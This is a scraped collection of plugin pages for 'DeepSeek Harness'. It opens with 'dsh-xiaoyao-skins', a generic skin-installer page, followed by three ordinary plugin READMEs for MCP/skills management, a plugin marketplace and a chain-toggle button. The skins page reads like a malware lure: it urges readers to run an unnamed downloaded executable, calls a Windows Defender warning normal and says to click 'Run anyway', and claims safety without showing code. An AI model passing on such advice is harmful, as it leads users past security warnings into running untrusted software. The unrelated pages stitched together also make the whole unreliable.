🎨 dsh-xiaoyao-skins - Beautiful Skins, One-Click Installation, Zero Skills Needed

Welcome! This page will help you get beautiful new looks for your DeepSeek Harness Web with almost no effort. You do not need to know any coding. You just need to click, download, and run. Let us walk you through it step by step. --- ## 🧐 What Is dsh-xiaoyao-skins? dsh-xiaoyao-skins is a free collection of visual themes, or "skins," made for the DeepSeek Harness Web application. Think of a skin like a new outfit for your software. It changes the colors, buttons, fonts, and overall style to make everything look fresh and modern. This project is created by the "夕小瑶" community, which means it is built with care and style. This tool also includes a simple installer and a community creation kit. The installer lets you add any skin with one click. The creation kit is for people who want to design their own skins later, but you do not need it to enjoy the skins today. --- ## 🚀 Getting Started (The Whole Process in 3 Simple Steps) Follow these steps in order. You will be done in under five minutes. ### Step 1: Get the Download Link The download link is available right at the top of this page. If you scroll up, you will see a big orange button that says "Download Now." Click it. This will take you to the official download page. You can also find the same link again in the **Download Section** below. ### Step 2: Download the Application Once you are on the download page, look for the file named something like `dsh-xiaoyao-skins-setup` or just the repository name. Click the download button. The file will start saving to your computer. Usually, it goes to your "Downloads" folder. The download might take a minute or two, depending on your internet speed. Be patient. ### Step 3: Run the Installer After the download finishes, open your "Downloads" folder. You will see a new file there. Double-click that file to run it. Your computer might show a blue or yellow popup asking if you trust this file. Click "Yes" or "Run" to continue. That is it. The installer will do all the work for you. Once the installer finishes, the application will open. You can now pick a skin from the list and apply it with one click. Enjoy your new look! --- ## 📥 Download Section (Important Link) Here is the official download link one more time:

⬇️ Visit This Link to Download the Application

This link will take you to the official page where you can download the application. There is no need to download anything else. Just this one file is enough. --- ## 🛠️ What Happens After You Run It? When you first open the application, you will see a clean and simple window. Here is what you can do: - **Browse Skins:** Scroll through the list of available skins. Each one shows a small preview picture. - **Apply a Skin:** Click on any skin you like, then click the "Apply" button. The change happens instantly. - **Preview Before Applying:** You can hover over a skin to see a larger preview on the right side of the window. - **Search for Skins:** There is a small search box at the top. Type a word like "dark" or "pink" to filter the list. - **Community Creations:** You will also find skins made by other users. These are marked with a small "Community" label. The application remembers your choice. So even if you close and reopen DeepSeek Harness Web, your selected skin will stay. --- ## 💡 Troubleshooting (If Something Goes Wrong) Most people will not have any problems. But just in case, here are quick fixes for common issues. ### The download does not start If you click the link and nothing happens, check your internet connection. Then, try using a different web browser (like Edge, Chrome, or Firefox). Sometimes a browser blocks automatic downloads. ### The file will not open If you double-click the file and nothing happens, right-click the file and choose "Run as administrator." If you still have trouble, try downloading the file again. The download might have been interrupted. ### The skin does not change After applying a skin, if nothing changes in DeepSeek Harness Web, close the DeepSeek Harness Web app completely. Then reopen it. The skin should now appear. If it still does not, restart your computer and try again. ### I see a red warning from Windows Defender This is normal. The application is new, so Windows might not recognize it yet. Click "More info" and then "Run anyway." The application is safe to use. It does not contain any harmful code. --- ## 🔒 Is This Safe? Yes. This application is open source, which means anyone can look at its code. It only changes the visual appearance of DeepSeek Harness Web. It does not access your personal files, passwords, or bank information. It does not connect to the internet unless you ask it to check for new skins. The community behind it is known for good quality and honest work. --- ## 🎨 What Skins Are Available? The library includes many popular styles: - **Dark Mode Pro:** A sleek, all-black theme with soft blue accents. Great for night time. - **Sunset Glow:** Warm orange and pink gradients, perfect for a cheerful workspace. - **Minimal White:** Clean, bright, and clutter-free. Ideal for focusing on work. - **Retro Terminal:** Green text on black background, like an old computer screen. - **Ocean Breeze:** Calming blues and teals, inspired by the sea. - **Neon Nights:** Bright purple and neon green, for a futuristic feel. - **Pastel Dreams:** Soft pinks, lavender, and mint. Very gentle on the eyes. These are just a few examples. The app includes more than 50 different skins. New ones are added regularly by the community. --- ## 🧩 Installing Skins from Others Sometimes you might find a skin file online, like on a forum or a Discord server. To use it: 1. Download the skin file (it will end with `.zip` or `.dshskin`). 2. Open the dsh-xiaoyao-skins application. 3. Click the "Import" button in the top left corner. 4. Select the skin file you downloaded. 5. The skin will appear in your list, ready to apply. Easy, right? --- ## 🌐 The Community Behind It This project is maintained by a group of volunteers who love making software look great. They share their work with everyone for free. If you ever want to say thank you, or if you have a suggestion for a new skin, you can reach out through the project's discussion page on the download link. You can also contribute your own skin designs. The application includes a "Create New Skin" button that guides you through the process. You do not need to be a programmer. You can choose colors and fonts using simple sliders. --- ## 📝 Final Words You now have everything you need. Download the application, run the installer, and pick a skin. That is all there is to it. In less than five minutes, your DeepSeek Harness Web will look brand new. No technical skill required. No confusing settings. Just pick and click. If you follow the steps above, you cannot go wrong. Enjoy your new look, and do not forget to check back often for fresh skins from the community. --- Keywords: ai-agent, community, deepseek-harness, dsh-plugin, skin, theme, xiaoyao

plugins.readme_text:
# dsh-mcp-skills

一个 [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) 插件，在网页设置面板中新增两个管理页面：

- **Skills** — 浏览、导入、删除、开关用户自有技能（存放于 `$DSH_HOME/skills`）。
- **MCP** — 管理 MCP 服务器配置（stdio / Streamable HTTP），支持增删改与连接测试。启用的服务器写入当前 profile 的 `cordis.patch.yml`，重启后自动连接，工具注册为 `mcp__<server>__<tool>`。

## 截图

**Skills 页面**

![Skills 页面](images/skills.png)

**MCP 页面**

![MCP 页面](images/mcp.png)

## 安装

要求：已安装带 web profile 的 dsh，且 `PATH` 中有 `pnpm`。

从 npm 安装：

```
dsh plugin --profile web add dsh-mcp-skills
```

从 GitHub 安装：

```sh
dsh plugin --profile web add https://github.com/Lrxc/dsh-manage-hub.git
```

或从本地目录：

```sh
git clone https://github.com/Lrxc/dsh-manage-hub.git
dsh plugin --profile web add file:./dsh-manage-hub
```

重启：

```sh
dsh --profile web
```

## 行为说明

- MCP 服务器保存在 `$DSH_HOME/mcp-servers.yaml`；启用的服务器会被写入当前 profile 的 `cordis.patch.yml`，重启 dsh 后自动连接。插件只增删自己生成的 `mcp-*` 行，不改动该文件的其他内容：注释、锚点与 `!!js` 表达式都会原样保留，写入是原子的，并会保留一份 `.bak` 备份。
- 若 profile 的 `cordis.patch.yml` 存在语法错误，插件会拒绝改写并报错，而不是覆盖它。
- 连接测试 15 秒超时，超时会关闭连接并回收子进程。测试与真实挂载使用同一套环境清洗规则：`*_KEY` / `*_PASSWORD` / `*_SECRET` / `*_TOKEN` 与 `DSH_*` 变量不会传给 MCP 子进程，需要凭据时请在服务器的环境变量里显式配置。
- 技能存放在 `$DSH_HOME/skills`。zip 导入支持单个技能（根目录 `SKILL.md` 或 `<name>/SKILL.md`）或多个技能目录，`template/` 会被跳过，已存在的技能不会被覆盖（导入结果会显示跳过数量）。
- 「测试」按钮使用宿主安装自带的 MCP SDK（列为可选 peer 依赖，不随本包重复安装）。若宿主未提供该 SDK，只有这一个按钮会提示不可用，技能管理与其余 MCP 功能不受影响。

## 卸载

```sh
dsh plugin --profile web remove dsh-mcp-skills
```

如不再需要，删除 profile `cordis.patch.yml` 中生成的 `mcp-*` 行及 `$DSH_HOME/mcp-servers.yaml`。



## 开发

发布到npm

```shell
# 1. 用官方 registry 重新登录（务必带 --registry，否则会登到镜像站）
npm login --registry=https://registry.npmjs.org --auth-type=web
# 2. 确认包名可用
npm view dsh-mcp-skills version
# 3. 检查 tarball（务必含 cordis.patch.yml）
npm pack --dry-run
# 4. 发布（稳定版，不要 prerelease）
npm publish
```



## License

MIT

plugins.description: 帮助寻找DSH插件，引导安装，并持续在DeepSeek Harness内收集插件评分、FAQ、踩坑记录并分享到社区
plugins.readme_text:
# DSH Plugin Marketplace

> Browse and install plugins in DeepSeek Harness, and share your usage feedback with the community.

[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![DSH Index](https://img.shields.io/badge/DSH%20Index-dshindex.dev-47848F)](https://dshindex.dev)

**English** · [中文](README.zh.md)

![Marketplace: search a skill source and add its install prompt to the active Harness message box](assets/marketplace-skill-install.gif)

## What it is

[DSH Index](https://dshindex.dev) is a public index of DeepSeek Harness plugins, built from the GitHub [`dsh-plugin`](https://github.com/topics/dsh-plugin) topic. **DSH Plugin Marketplace** brings that index into [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness): browse and inspect plugins, install them with your explicit confirmation, and report back to the community.

It runs inside DeepSeek Harness as a plugin, and ships the same capabilities to the `dsh-index` CLI.

## Installation

```sh
dsh plugin --profile web add @dshindex/dsh-plugin-marketplace
```

Then restart `dsh web`. The package ships a host plugin, a Web client bundle, and the `dsh-index` CLI in one bundle.

## Features

### In DSH Web

- **Discover** — search and inspect DSH Index sources, see the current indexed total, and hand an editable `Install plugin <repository URL>` prompt to the Agent.
- **Report issues** — turn a failure into a redacted GitHub or Gitee Issue draft; review and submit it, then watch its state.
- **Give feedback** — score a plugin, answer an FAQ, or report a pitfall.

### In the CLI

The same typed client powers the DSH tools and the `dsh-index` CLI:

```text
dsh-index doctor
dsh-index plugins list --query "git" --tag workflow --cursor <cursor>
dsh-index plugins summary
dsh-index plugins show owner/repo
dsh-index install prepare owner/repo
dsh-index issue draft github owner/repo --title "…" --body "…"
dsh-index issue submit github owner/repo --title "…" --body "…" --confirm
dsh-index issue watch github owner/repo 42 --etag <etag>
dsh-index report score owner/repo --score 4 --share
dsh-index report faq owner/repo --text "…" --share
dsh-index report pitfall owner/repo --text "…" --share
```

The CLI is an interface to the same policy-enforced library, not a route around consent. In Harness, the equivalent abilities are model-callable tools whose side-effecting calls go through the normal user-approval policy.

## Trust & consent by design

- A `dsh-plugin` topic match is a **discovery candidate**, never a compatibility or safety claim.
- Every install is a user-confirmed handoff — there is no background install.
- Issue drafts are redacted before submission; tokens, secrets, source files, and raw transcripts are excluded by default.
- Scores and reports stay private until the author opts in and DSH Index approves them.
- Issue polling is local and conservative, using conditional reads and backoff.

## Relationship to DSH Index

| Product | Responsibility | It does not do |
| --- | --- | --- |
| [DSH Index](https://dshindex.dev) | Public discovery, daily snapshots, observed movement, and moderated community reference | Certify a repository, audit security, or recommend an installation |
| Marketplace | DeepSeek Harness action layer: search, inspect, user-confirmed install, issue drafts/status, and contributions | Silently install packages, silently file issues, or publish raw user data |

## Development

```sh
npm install
npm run check   # build + 100% coverage tests
```

## License

MIT. See [LICENSE](LICENSE).

plugins.readme_text:
dsh-chain-toggle-all

DSH Web GUI 一键展开/收起全部思维链与工具链
会话头部一个按钮：展开全部 Think 链 + 工具链，再点一下全部收起。

## 功能 - 在会话头部操作行新增「**展开全部 / 收起全部**」按钮 - 点击「展开全部」：当前会话内**所有**思维链（Think）与工具链（Tool call）一次性展开 - 点击「收起全部」：全部折叠回一行摘要 - 按钮文案随真实状态自动切换：手动展开/收起任意一条链，按钮文字也会跟着变（MutationObserver 监听 `aria-expanded`） - 会话内没有任何链时按钮自动隐藏，不占空间 ## 安装 官方 **bundle 插件** 格式（仓库根 `package.json` 的 `dsh.bundle` + `dsh.client`）。经官方 profile 管理： ```sh dsh plugin --profile web add "github:NekoDD-wow/dsh-chain-toggle-all" # git 源（推荐） ``` 装完 **重启 web**（bundle 层在启动时合成），会话头部标题右侧即可看到按钮。 ## 工作原理 思维链（`ReasoningRow`）与工具链（`ToolRow`）底层共用同一个 `DisclosureRow` 组件，每行带有： - `data-disclosure-row` — 行标记 - `aria-expanded` — 展开状态 - 整行 `role=button`，点击即切换展开 插件扫描会话滚动容器（`[data-conversation-scroll]`）内的 `[data-variant="think"] [data-disclosure-row], [data-tool] [data-disclosure-row]`， 确定目标状态（有任何折叠 → 全部展开；全部展开 → 全部收起）后对目标行执行 `.click()`。 纯前端实现：不修改 DSH 源码，不注入全局样式，插件卸载即完全还原。 ## 开发 ``` dsh-chain-toggle-all/ ├── package.json # dsh.bundle.patch + dsh.client 元数据 ├── cordis.patch.yml # profile 组合层插入行 └── .dsh-plugin/ ├── package.json ├── index.mjs # host half（空 apply，占位） └── client.js # browser half（__ModuleLoader__ bundle） ``` ## License MIT
